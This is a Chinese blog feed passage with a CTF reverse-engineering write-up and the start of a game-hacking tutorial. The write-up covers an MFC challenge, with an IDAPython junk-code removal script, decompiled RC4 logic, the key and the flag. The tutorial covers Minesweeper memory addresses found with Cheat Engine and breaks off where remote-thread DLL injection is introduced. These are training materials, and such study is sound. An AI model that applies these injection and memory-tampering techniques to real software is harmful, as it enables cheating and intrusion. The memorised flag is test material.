src="https://cdn.nlark.com/yuque/0/2024/png/35661858/1722526003830-a2136d17-81f1-4a2e-82c4-206fa5ab6f75.png#averageHue=%23a5b298&amp;clientId=u2e6d0d4c-f6f2-4&amp;from=paste&amp;height=590&amp;id=ueb131a0d&amp;originHeight=737&amp;originWidth=1001&amp;originalType=binary&amp;ratio=1.25&amp;rotation=0&amp;showTitle=false&amp;size=72626&amp;status=done&amp;style=none&amp;taskId=u2a5dd074-4743-4e9e-b50e-637817f835b&amp;title=&amp;width=800.8" alt="image.png"><br>flag{thIs_Is_real_kEy_hahaaa}</p><h2 id="Junk-instruction-西湖论剑"><a href="#Junk-instruction-西湖论剑" class="headerlink" title="Junk_instruction-西湖论剑"></a>Junk_instruction-西湖论剑</h2><p>下面，再讲解一道大型比赛的赛题来实验<br>打开，看到这个朴素的界面可以鉴定是MFC框架。<br><img src="/2024/09/02/MFC%E6%A1%86%E6%9E%B6%E8%BD%AF%E4%BB%B6%E9%80%86%E5%90%91%E7%A0%94%E7%A9%B6/image-20240902115423041.png" alt="image-20240902115423041"><br>我们看到了一个input，还有一个check button，很明显，我们首先就需要去找check button的id&amp;注册函数。</p><h3 id="xspy-MFC分析"><a href="#xspy-MFC分析" class="headerlink" title="xspy-MFC分析"></a>xspy-MFC分析</h3><p><img src="/2024/09/02/MFC%E6%A1%86%E6%9E%B6%E8%BD%AF%E4%BB%B6%E9%80%86%E5%90%91%E7%A0%94%E7%A9%B6/image-20240902115427974.png" alt="image-20240902115427974"><br>check按钮的id为03e9，同时窗口存在OnCommand: notifycode=0000 id=03e9,func= 0x00C72420(Junk_Instruction.exe+ 0x002420 )函数。<br>那么对应的check逻辑肯定在基址+偏移0x002420处。<br>打开ida，找到check函数  sub_402420 ，如下图<br><img src="/2024/09/02/MFC%E6%A1%86%E6%9E%B6%E8%BD%AF%E4%BB%B6%E9%80%86%E5%90%91%E7%A0%94%E7%A9%B6/image-20240902115432343.png" alt="image-20240902115432343"><br>可以看到有一个条件判断：if ( (unsigned __int8)sub_402600(v2 + 16) )。一眼顶针，<br>两个分支分别是弹出正确和错误的对话框，为什么呢？if else函数体内容基本一样。<br>当然我们还是动态调试一下<br><img src="/2024/09/02/MFC%E6%A1%86%E6%9E%B6%E8%BD%AF%E4%BB%B6%E9%80%86%E5%90%91%E7%A0%94%E7%A9%B6/image-20240902115436534.png" alt="image-20240902115436534"><br>所以enc函数很明显就是sub_402600<br>这个函数中就出现了很多垃圾指令了，也就对应上题目名称Junk_instruction了。</p><h3 id="去花-IDA分析"><a href="#去花-IDA分析" class="headerlink" title="去花-IDA分析"></a>去花-IDA分析</h3><p>爆红<br><img src="/2024/09/02/MFC%E6%A1%86%E6%9E%B6%E8%BD%AF%E4%BB%B6%E9%80%86%E5%90%91%E7%A0%94%E7%A9%B6/image-20240902115440694.png" alt="image-20240902115440694"></p><p>花指令，经典call    $+5起手，就是先用一个call压好返回地址，再把栈里的返回地址弹出来，改一下，压回去，如此反复。<br>去掉也很简单，我们把下述累死指令块全部nop掉即可，有好几处，一模一样。<br><img src="/2024/09/02/MFC%E6%A1%86%E6%9E%B6%E8%BD%AF%E4%BB%B6%E9%80%86%E5%90%91%E7%A0%94%E7%A9%B6/image-20240902115444505.png" alt="image-20240902115444505"><br>当然，我们使用idapython脚本自动去花</p><figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> ida_bytes <span class="keyword">import</span> get_bytes, patch_bytes</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line">addr = <span class="number">0x402600</span></span><br><span class="line">end = <span class="number">0x402fe3</span></span><br><span class="line">buf = get_bytes(addr, end-addr)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">nopp</span>(<span class="params">s</span>):</span><br><span class="line">    s = s.group(<span class="number">0</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">""</span>.join([<span class="string">"%02x"</span>%i <span class="keyword">for</span> i <span class="keyword">in</span> s]))</span><br><span class="line">    s = <span class="string">b"\x90"</span>*<span class="built_in">len</span>(s)</span><br><span class="line">    <span class="keyword">return</span> s</span><br><span class="line">pattern  = <span class="string">b"\xe8\x00\x00\x00\x00\x58\x89.*?\xc3.*?\x22"</span></span><br><span class="line">buf = re.sub(pattern , nopp, buf, flags=re.I)</span><br><span class="line">patch_bytes(addr, buf)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">"Done"</span>)</span><br></pre></td></tr></tbody></table></figure><p><img src="/2024/09/02/MFC%E6%A1%86%E6%9E%B6%E8%BD%AF%E4%BB%B6%E9%80%86%E5%90%91%E7%A0%94%E7%A9%B6/image-20240902115452273.png" alt="image-20240902115452273"></p><h3 id="加密"><a href="#加密" class="headerlink" title="加密"></a>加密</h3><p>去除花指令，简单审计<br>发现是对程序进行RC4加密，最后还对输入进行了个倒叙<br><img src="/2024/09/02/MFC%E6%A1%86%E6%9E%B6%E8%BD%AF%E4%BB%B6%E9%80%86%E5%90%91%E7%A0%94%E7%A9%B6/image-20240902115457550.png" alt="image-20240902115457550"><br><img src="/2024/09/02/MFC%E6%A1%86%E6%9E%B6%E8%BD%AF%E4%BB%B6%E9%80%86%E5%90%91%E7%A0%94%E7%A9%B6/image-20240902115502026.png" alt="image-20240902115502026"><img src="https://cdn.nlark.com/yuque/0/2024/png/35661858/1722529609420-bf9edfa4-f3ad-477a-9482-61b4cd2c199d.png#averageHue=%23fdfdfd&amp;clientId=u2e6d0d4c-f6f2-4&amp;from=paste&amp;height=521&amp;id=u4e2b362a&amp;originHeight=651&amp;originWidth=1026&amp;originalType=binary&amp;ratio=1.25&amp;rotation=0&amp;showTitle=false&amp;size=59943&amp;status=done&amp;style=none&amp;taskId=u59625ae0-9775-4d32-89e5-09a7fc82c1a&amp;title=&amp;width=820.8" alt="image.png"><br>去花后，整理一下，代码如下</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">char</span> __thiscall <span class="title function_">sub_402600</span><span class="params">(<span class="type">void</span> *this, <span class="type">int</span> a2)</span></span><br><span class="line">{</span><br><span class="line">  <span class="type">const</span> WCHAR *v2; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">void</span> *v3; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">char</span> v5[<span class="number">511</span>]; <span class="comment">// [esp+9h] [ebp-4BBh] BYREF</span></span><br><span class="line">  <span class="type">int</span> v6; <span class="comment">// [esp+208h] [ebp-2BCh]</span></span><br><span class="line">  <span class="type">char</span> *v7; <span class="comment">// [esp+20Ch] [ebp-2B8h]</span></span><br><span class="line">  <span class="type">int</span> v8; <span class="comment">// [esp+210h] [ebp-2B4h]</span></span><br><span class="line">  <span class="type">size_t</span> Count; <span class="comment">// [esp+214h] [ebp-2B0h]</span></span><br><span class="line">  <span class="type">int</span> v10; <span class="comment">// [esp+218h] [ebp-2ACh]</span></span><br><span class="line">  <span class="type">size_t</span> v11; <span class="comment">// [esp+21Ch] [ebp-2A8h]</span></span><br><span class="line">  <span class="type">char</span> *v12; <span class="comment">// [esp+220h] [ebp-2A4h]</span></span><br><span class="line">  <span class="type">char</span> *v13; <span class="comment">// [esp+224h] [ebp-2A0h]</span></span><br><span class="line">  <span class="type">int</span> v14; <span class="comment">// [esp+228h] [ebp-29Ch]</span></span><br><span class="line">  <span class="type">char</span> v15[<span class="number">4</span>]; <span class="comment">// [esp+22Ch] [ebp-298h] BYREF</span></span><br><span class="line">  <span class="type">char</span> *Source; <span class="comment">// [esp+230h] [ebp-294h]</span></span><br><span class="line">  <span class="type">void</span> *v17; <span class="comment">// [esp+234h] [ebp-290h]</span></span><br><span class="line">  <span class="type">char</span> cipher[<span class="number">32</span>]; <span class="comment">// [esp+238h] [ebp-28Ch]</span></span><br><span class="line">  <span class="type">const</span> <span class="type">char</span> *v19; <span class="comment">// [esp+258h] [ebp-26Ch]</span></span><br><span class="line">  <span class="type">char</span> *v20; <span class="comment">// [esp+25Ch] [ebp-268h]</span></span><br><span class="line">  <span class="type">int</span> i; <span class="comment">// [esp+260h] [ebp-264h]</span></span><br><span class="line">  <span class="type">char</span> *p_Destination; <span class="comment">// [esp+264h] [ebp-260h]</span></span><br><span class="line">  <span class="type">char</span> v23; <span class="comment">// [esp+26Dh] [ebp-257h]</span></span><br><span class="line">  <span class="type">char</span> v24; <span class="comment">// [esp+26Eh] [ebp-256h]</span></span><br><span class="line">  <span class="type">char</span> v25; <span class="comment">// [esp+26Fh] [ebp-255h]</span></span><br><span class="line">  <span class="type">char</span> v26[<span class="number">28</span>]; <span class="comment">// [esp+270h] [ebp-254h] BYREF</span></span><br><span class="line">  <span class="type">char</span> v27[<span class="number">256</span>]; <span class="comment">// [esp+28Ch] [ebp-238h] BYREF</span></span><br><span class="line">  <span class="type">char</span> key[<span class="number">256</span>]; <span class="comment">// [esp+38Ch] [ebp-138h] BYREF</span></span><br><span class="line">  <span class="type">char</span> Destination; <span class="comment">// [esp+48Ch] [ebp-38h] BYREF</span></span><br><span class="line">  <span class="type">char</span> v30[<span class="number">39</span>]; <span class="comment">// [esp+48Dh] [ebp-37h] BYREF</span></span><br><span class="line">  <span class="type">int</span> v31; <span class="comment">// [esp+4C0h] [ebp-4h]</span></span><br><span class="line"></span><br><span class="line">  v17 = this;</span><br><span class="line">  v31 = <span class="number">3</span>;</span><br><span class="line">  cipher[<span class="number">0</span>] = <span class="number">91</span>;</span><br><span class="line">  cipher[<span class="number">1</span>] = <span class="number">-42</span>;</span><br><span class="line">  cipher[<span class="number">2</span>] = <span class="number">-48</span>;</span><br><span class="line">  cipher[<span class="number">3</span>] = <span class="number">38</span>;</span><br><span class="line">  cipher[<span class="number">4</span>] = <span class="number">-56</span>;</span><br><span class="line">  cipher[<span class="number">5</span>] = <span class="number">-35</span>;</span><br><span class="line">  cipher[<span class="number">6</span>] = <span class="number">25</span>;</span><br><span class="line">  cipher[<span class="number">7</span>] = <span class="number">126</span>;</span><br><span class="line">  cipher[<span class="number">8</span>] = <span class="number">110</span>;</span><br><span class="line">  cipher[<span class="number">9</span>] = <span class="number">62</span>;</span><br><span class="line">  cipher[<span class="number">10</span>] = <span class="number">-53</span>;</span><br><span class="line">  cipher[<span class="number">11</span>] = <span class="number">22</span>;</span><br><span class="line">  cipher[<span class="number">12</span>] = <span class="number">-111</span>;</span><br><span class="line">  cipher[<span class="number">13</span>] = <span class="number">125</span>;</span><br><span class="line">  cipher[<span class="number">14</span>] = <span class="number">-1</span>;</span><br><span class="line">  cipher[<span class="number">15</span>] = <span class="number">-81</span>;</span><br><span class="line">  cipher[<span class="number">16</span>] = <span class="number">-35</span>;</span><br><span class="line">  cipher[<span class="number">17</span>] = <span class="number">118</span>;</span><br><span class="line">  cipher[<span class="number">18</span>] = <span class="number">100</span>;</span><br><span class="line">  cipher[<span class="number">19</span>] = <span class="number">-80</span>;</span><br><span class="line">  cipher[<span class="number">20</span>] = <span class="number">-9</span>;</span><br><span class="line">  cipher[<span class="number">21</span>] = <span class="number">-27</span>;</span><br><span class="line">  cipher[<span class="number">22</span>] = <span class="number">-119</span>;</span><br><span class="line">  cipher[<span class="number">23</span>] = <span class="number">87</span>;</span><br><span class="line">  cipher[<span class="number">24</span>] = <span class="number">-126</span>;</span><br><span class="line">  cipher[<span class="number">25</span>] = <span class="number">-97</span>;</span><br><span class="line">  cipher[<span class="number">26</span>] = <span class="number">12</span>;</span><br><span class="line">  cipher[<span class="number">27</span>] = <span class="number">0</span>;</span><br><span class="line">  cipher[<span class="number">28</span>] = <span class="number">-98</span>;</span><br><span class="line">  cipher[<span class="number">29</span>] = <span class="number">-48</span>;</span><br><span class="line">  cipher[<span class="number">30</span>] = <span class="number">69</span>;</span><br><span class="line">  cipher[<span class="number">31</span>] = <span class="number">-6</span>;</span><br><span class="line">  v2 = (<span class="type">const</span> WCHAR *)sub_401570(&amp;a2);</span><br><span class="line">  v14 = sub_4030A0(v2);</span><br><span class="line">  v10 = v14;</span><br><span class="line">  v3 = (<span class="type">void</span> *)sub_401570(v14);</span><br><span class="line">  sub_403000(v3);</span><br><span class="line">  sub_4012A0(v15);</span><br><span class="line">  Source = (<span class="type">char</span> *)unknown_libname_1(v26);</span><br><span class="line">  v20 = Source;</span><br><span class="line">  v13 = Source + <span class="number">1</span>;</span><br><span class="line">  v20 += <span class="built_in">strlen</span>(v20);</span><br><span class="line">  v11 = ++v20 - (Source + <span class="number">1</span>);</span><br><span class="line">  Count = v11;</span><br><span class="line">  Destination = <span class="number">0</span>;</span><br><span class="line">  <span class="built_in">memset</span>(v30, <span class="number">0</span>, <span class="keyword">sizeof</span>(v30));</span><br><span class="line">  <span class="built_in">strncpy</span>(&amp;Destination, Source, v11);</span><br><span class="line">  <span class="keyword">if</span> ( sub_402AF0(&amp;Destination) )</span><br><span class="line">  {</span><br><span class="line">    v23 = <span class="number">0</span>;</span><br><span class="line">    v25 = <span class="number">0</span>;</span><br><span class="line">LABEL_7:</span><br><span class="line">    v24 = v25;</span><br><span class="line">  }</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  {</span><br><span class="line">    <span class="built_in">strcpy</span>(key, <span class="string">"qwertyuiop"</span>);                  <span class="comment">// key</span></span><br><span class="line">    <span class="built_in">memset</span>(&amp;key[<span class="number">11</span>], <span class="number">0</span>, <span class="number">0xF5</span>u);</span><br><span class="line">    <span class="built_in">memset</span>(v27, <span class="number">0</span>, <span class="keyword">sizeof</span>(v27));</span><br><span class="line">    <span class="built_in">memset</span>(v5, <span class="number">0</span>, <span class="keyword">sizeof</span>(v5));</span><br><span class="line">    v19 = key;</span><br><span class="line">    v7 = &amp;key[<span class="number">1</span>];</span><br><span class="line">    v19 += <span class="built_in">strlen</span>(v19);</span><br><span class="line">    v6 = ++v19 - &amp;key[<span class="number">1</span>];</span><br><span class="line">    RC4_init((<span class="type">int</span>)v27, key, v19 - &amp;key[<span class="number">1</span>]);     <span class="comment">// RC4_init</span></span><br><span class="line">    p_Destination = &amp;Destination;</span><br><span class="line">    v12 = v30;</span><br><span class="line">    p_Destination += <span class="built_in">strlen</span>(p_Destination);</span><br><span class="line">    v8 = ++p_Destination - v30;</span><br><span class="line">    RC4_crypt((<span class="type">int</span>)v27, (<span class="type">int</span>)&amp;Destination, p_Destination - v30);<span class="comment">// RC4_crypto</span></span><br><span class="line">    <span class="keyword">for</span> ( i = <span class="number">31</span>; i &gt;= <span class="number">0</span>; --i )</span><br><span class="line">    {</span><br><span class="line">      <span class="keyword">if</span> ( v30[i - <span class="number">1</span>] != cipher[i] )            <span class="comment">// 倒叙</span></span><br><span class="line">      {</span><br><span class="line">        v25 = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">goto</span> LABEL_7;</span><br><span class="line">      }</span><br><span class="line">    }</span><br><span class="line">    v24 = <span class="number">1</span>;</span><br><span class="line">  }</span><br><span class="line">  LOBYTE(v31) = <span class="number">0</span>;</span><br><span class="line">  sub_403060(v26);</span><br><span class="line">  v31 = <span class="number">-1</span>;</span><br><span class="line">  sub_4012A0(&amp;a2);</span><br><span class="line">  <span class="keyword">return</span> v24;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><h3 id="解密"><a href="#解密" class="headerlink" title="解密"></a>解密</h3><p>首先提取密文，利用插件Lazy_ida<br>5BD6D026C8DD197E6E3ECB16917DFFAFDD7664B0F7E58957829F0C009ED045FA<br><img src="/2024/09/02/MFC%E6%A1%86%E6%9E%B6%E8%BD%AF%E4%BB%B6%E9%80%86%E5%90%91%E7%A0%94%E7%A9%B6/image-20240902115509492.png" alt="image-20240902115509492"><br>key–&gt;qwertyuiop<br>cyberchef 得解<img src="/2024/09/02/MFC%E6%A1%86%E6%9E%B6%E8%BD%AF%E4%BB%B6%E9%80%86%E5%90%91%E7%A0%94%E7%A9%B6/image-20240902115514831.png" alt="image-20240902115514831"><br>flag{973387a11fa3f724d74802857d3e052f}<br><img src="/2024/09/02/MFC%E6%A1%86%E6%9E%B6%E8%BD%AF%E4%BB%B6%E9%80%86%E5%90%91%E7%A0%94%E7%A9%B6/image-20240902115523670.png" alt="image-20240902115523670"></p></body></html>]]></content>
      
      
      <categories>
          
          <category> 二进制学习 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 逆向探究 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>游戏安全入门-扫雷分析/远程线程注入</title>
      <link href="/2024/07/26/%E6%B8%B8%E6%88%8F%E5%AE%89%E5%85%A8%E5%85%A5%E9%97%A8-%E6%89%AB%E9%9B%B7%E5%88%86%E6%9E%90-%E8%BF%9C%E7%A8%8B%E7%BA%BF%E7%A8%8B%E6%B3%A8%E5%85%A5/"/>
      <url>/2024/07/26/%E6%B8%B8%E6%88%8F%E5%AE%89%E5%85%A8%E5%85%A5%E9%97%A8-%E6%89%AB%E9%9B%B7%E5%88%86%E6%9E%90-%E8%BF%9C%E7%A8%8B%E7%BA%BF%E7%A8%8B%E6%B3%A8%E5%85%A5/</url>
      
        <content type="html"><![CDATA[<html><head></head><body><h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>无论学习什么，首先，我们应该有个目标，那么入门windows游戏安全，脑海中浮现出来的一个游戏 – 扫雷，一款家喻户晓的游戏，虽然已经被大家分析的不能再透了，但是我觉得自己去分析一下还是极好的，把它作为一个小目标再好不过了。</p><p>我们编写一个妙妙小工具，工具要求实现以下功能：时间暂停、修改表情、透视、一键扫雷等等。</p><p>本文所用工具：</p><p>Cheat Engine、x32dbg(ollydbg)、Visual Studio 2019</p><h1 id="扫雷游戏分析"><a href="#扫雷游戏分析" class="headerlink" title="扫雷游戏分析"></a>扫雷游戏分析</h1><p>游戏数据在内存中是地址，那么第一个任务，找内存地址</p><p>打开CE修改器</p><h2 id="修改时间-gt-时间暂停"><a href="#修改时间-gt-时间暂停" class="headerlink" title="修改时间->时间暂停"></a>修改时间-&gt;时间暂停</h2><p>计数器的时间是一个精确的值，所以我们通过精确数值扫描出来，游戏开始之前计数器上的数是0，所以我们扫描0。</p><p><img src="/2024/07/26/%E6%B8%B8%E6%88%8F%E5%AE%89%E5%85%A8%E5%85%A5%E9%97%A8-%E6%89%AB%E9%9B%B7%E5%88%86%E6%9E%90-%E8%BF%9C%E7%A8%8B%E7%BA%BF%E7%A8%8B%E6%B3%A8%E5%85%A5/image-20240726181203793.png" alt="image-20240726181203793"></p><p>时间在变化，选择介于什么数值之间再次扫描</p><p><img src="/2024/07/26/%E6%B8%B8%E6%88%8F%E5%AE%89%E5%85%A8%E5%85%A5%E9%97%A8-%E6%89%AB%E9%9B%B7%E5%88%86%E6%9E%90-%E8%BF%9C%E7%A8%8B%E7%BA%BF%E7%A8%8B%E6%B3%A8%E5%85%A5/image-20240726181321374.png" alt="image-20240726181321374"></p><p>可得 0x100579c — winmine.exe+579C</p><p><img src="/2024/07/26/%E6%B8%B8%E6%88%8F%E5%AE%89%E5%85%A8%E5%85%A5%E9%97%A8-%E6%89%AB%E9%9B%B7%E5%88%86%E6%9E%90-%E8%BF%9C%E7%A8%8B%E7%BA%BF%E7%A8%8B%E6%B3%A8%E5%85%A5/image-20240727095459095.png" alt="image-20240727095459095"></p><p>我们发现这个数据都是直接通过基址 + 固定偏移能直接得到的。</p><p>然后我们对这个数据去找出 <strong>是什么改写了这个地址</strong>，得到一个指令和指针：</p><p><img src="/2024/07/26/%E6%B8%B8%E6%88%8F%E5%AE%89%E5%85%A8%E5%85%A5%E9%97%A8-%E6%89%AB%E9%9B%B7%E5%88%86%E6%9E%90-%E8%BF%9C%E7%A8%8B%E7%BA%BF%E7%A8%8B%E6%B3%A8%E5%85%A5/image-20240727101122161.png" alt="image-20240727101122161"></p><p>时间：0x100579c</p><h2 id="修改表情-没啥用"><a href="#修改表情-没啥用" class="headerlink" title="修改表情 - 没啥用"></a>修改表情 - 没啥用</h2><p>修改表情这个功能怎么搞我觉得还是很容易想到的，这个按钮的作用是重新开始游戏，开始游戏，游戏胜利，游戏失败。</p><p>（表情的状态被分成了两个变量（4byte）来控制）</p><p>所以它是一种状态，所以我们通过0和1进行扫描，游戏进行状态输入1进行扫描，还原游戏之后输入0进行扫描。</p><p>首先是游戏进行状态，输入1进行扫描</p><p><img src="/2024/07/26/%E6%B8%B8%E6%88%8F%E5%AE%89%E5%85%A8%E5%85%A5%E9%97%A8-%E6%89%AB%E9%9B%B7%E5%88%86%E6%9E%90-%E8%BF%9C%E7%A8%8B%E7%BA%BF%E7%A8%8B%E6%B3%A8%E5%85%A5/image-20240726172926279.png" alt="image-20240726172926279"></p><p>再点击表情，将游戏还原，输入0开始扫描</p><p><img src="/2024/07/26/%E6%B8%B8%E6%88%8F%E5%AE%89%E5%85%A8%E5%85%A5%E9%97%A8-%E6%89%AB%E9%9B%B7%E5%88%86%E6%9E%90-%E8%BF%9C%E7%A8%8B%E7%BA%BF%E7%A8%8B%E6%B3%A8%E5%85%A5/image-20240726173027567.png" alt="image-20240726173027567"></p><p>如此反复进行扫描，得到表情的内存地址</p><p>0x1005164 – winmine.exe+5164</p><p><img src="/2024/07/26/%E6%B8%B8%E6%88%8F%E5%AE%89%E5%85%A8%E5%85%A5%E9%97%A8-%E6%89%AB%E9%9B%B7%E5%88%86%E6%9E%90-%E8%BF%9C%E7%A8%8B%E7%BA%BF%E7%A8%8B%E6%B3%A8%E5%85%A5/image-20240726173341581.png" alt="image-20240726173341581"></p><p>但是嘞，修改成2或者3，表情没有心得反应，所以控制游戏胜利和游戏失败的是其他的地址，我们知道，一般来说，一个功能的代码在内存中基本上都是连续的，(就像你修改一个游戏的血量，浏览血量内存块，你可以发现怒气，蓝量等内存地址)</p><p>所以，我们浏览内存</p><p><img src="/2024/07/26/%E6%B8%B8%E6%88%8F%E5%AE%89%E5%85%A8%E5%85%A5%E9%97%A8-%E6%89%AB%E9%9B%B7%E5%88%86%E6%9E%90-%E8%BF%9C%E7%A8%8B%E7%BA%BF%E7%A8%8B%E6%B3%A8%E5%85%A5/image-20240726175917236.png" alt="image-20240726175917236"></p><p><img src="/2024/07/26/%E6%B8%B8%E6%88%8F%E5%AE%89%E5%85%A8%E5%85%A5%E9%97%A8-%E6%89%AB%E9%9B%B7%E5%88%86%E6%9E%90-%E8%BF%9C%E7%A8%8B%E7%BA%BF%E7%A8%8B%E6%B3%A8%E5%85%A5/image-20240726180034088.png" alt="image-20240726180034088"></p><p>0x1005164-4 = 0x1005160</p><p>修改为3，发现出现了戴墨镜的表情（游戏胜利）</p><p><strong>但是这个胜利知识一个状态，并不能说明扫雷完成</strong>.</p><p><img src="/2024/07/26/%E6%B8%B8%E6%88%8F%E5%AE%89%E5%85%A8%E5%85%A5%E9%97%A8-%E6%89%AB%E9%9B%B7%E5%88%86%E6%9E%90-%E8%BF%9C%E7%A8%8B%E7%BA%BF%E7%A8%8B%E6%B3%A8%E5%85%A5/image-20240726180234379.png" alt="image-20240726180234379"></p><p>表情：0x1005160与0x1005164</p><h2 id="透视-显示雷区"><a href="#透视-显示雷区" class="headerlink" title="透视 - 显示雷区"></a>透视 - 显示雷区</h2><p>思考游戏结束的时候会自动显示所有的雷，因此我们动态调试，看看在哪个函数调用之后会显示所有的雷</p><p><img src="/2024/07/26/%E6%B8%B8%E6%88%8F%E5%AE%89%E5%85%A8%E5%85%A5%E9%97%A8-%E6%89%AB%E9%9B%B7%E5%88%86%E6%9E%90-%E8%BF%9C%E7%A8%8B%E7%BA%BF%E7%A8%8B%E6%B3%A8%E5%85%A5/image-20240727115001667.png" alt="image-20240727115001667"></p><p><img src="/2024/07/26/%E6%B8%B8%E6%88%8F%E5%AE%89%E5%85%A8%E5%85%A5%E9%97%A8-%E6%89%AB%E9%9B%B7%E5%88%86%E6%9E%90-%E8%BF%9C%E7%A8%8B%E7%BA%BF%E7%A8%8B%E6%B3%A8%E5%85%A5/image-20240727114813202.png" alt="image-20240727114813202"></p><p>经过几次的动态调试之后发现：0x2F80函数是我们要找的结果。</p><p><img src="/2024/07/26/%E6%B8%B8%E6%88%8F%E5%AE%89%E5%85%A8%E5%85%A5%E9%97%A8-%E6%89%AB%E9%9B%B7%E5%88%86%E6%9E%90-%E8%BF%9C%E7%A8%8B%E7%BA%BF%E7%A8%8B%E6%B3%A8%E5%85%A5/image-20240727120510452.png" alt="image-20240727120510452"></p><h2 id="一键扫雷"><a href="#一键扫雷" class="headerlink" title="一键扫雷"></a>一键扫雷</h2><p>通过透视，我们玩一把游戏，使得游戏胜利(点完最后一个)</p><p><img src="/2024/07/26/%E6%B8%B8%E6%88%8F%E5%AE%89%E5%85%A8%E5%85%A5%E9%97%A8-%E6%89%AB%E9%9B%B7%E5%88%86%E6%9E%90-%E8%BF%9C%E7%A8%8B%E7%BA%BF%E7%A8%8B%E6%B3%A8%E5%85%A5/image-20240727113313172.png" alt="image-20240727113313172"></p><p><img src="/2024/07/26/%E6%B8%B8%E6%88%8F%E5%AE%89%E5%85%A8%E5%85%A5%E9%97%A8-%E6%89%AB%E9%9B%B7%E5%88%86%E6%9E%90-%E8%BF%9C%E7%A8%8B%E7%BA%BF%E7%A8%8B%E6%B3%A8%E5%85%A5/image-20240727121653775.png" alt="image-20240727121653775"></p><p>然后后两个函数，是破纪录跟英雄榜的函数</p><p><img src="/2024/07/26/%E6%B8%B8%E6%88%8F%E5%AE%89%E5%85%A8%E5%85%A5%E9%97%A8-%E6%89%AB%E9%9B%B7%E5%88%86%E6%9E%90-%E8%BF%9C%E7%A8%8B%E7%BA%BF%E7%A8%8B%E6%B3%A8%E5%85%A5/image-20240727121729047.png" alt="image-20240727121729047"></p><p><img src="/2024/07/26/%E6%B8%B8%E6%88%8F%E5%AE%89%E5%85%A8%E5%85%A5%E9%97%A8-%E6%89%AB%E9%9B%B7%E5%88%86%E6%9E%90-%E8%BF%9C%E7%A8%8B%E7%BA%BF%E7%A8%8B%E6%B3%A8%E5%85%A5/image-20240727121747495.png" alt="image-20240727121747495"></p><p>ret来到了这儿，游戏通关了，来到了这儿，可以知道，这个0x347c就是判断输赢的函数</p><p>并且通过调试发现由一个参数 0 1 来控制，所以跟透视差不多，带个参数线程回调就完了</p><p><img src="/2024/07/26/%E6%B8%B8%E6%88%8F%E5%AE%89%E5%85%A8%E5%85%A5%E9%97%A8-%E6%89%AB%E9%9B%B7%E5%88%86%E6%9E%90-%E8%BF%9C%E7%A8%8B%E7%BA%BF%E7%A8%8B%E6%B3%A8%E5%85%A5/image-20240727121856926.png" alt="image-20240727121856926"></p><h1 id="编写妙妙小工具"><a href="#编写妙妙小工具" class="headerlink" title="编写妙妙小工具"></a>编写妙妙小工具</h1><p>怎么实现这个工具呢，当然是选择DLL注入</p><p>那么dll 怎么注入进去呢，这里选择远程线程注入</p><p>这里先简单介绍下什么是远程线程注入</p><h2 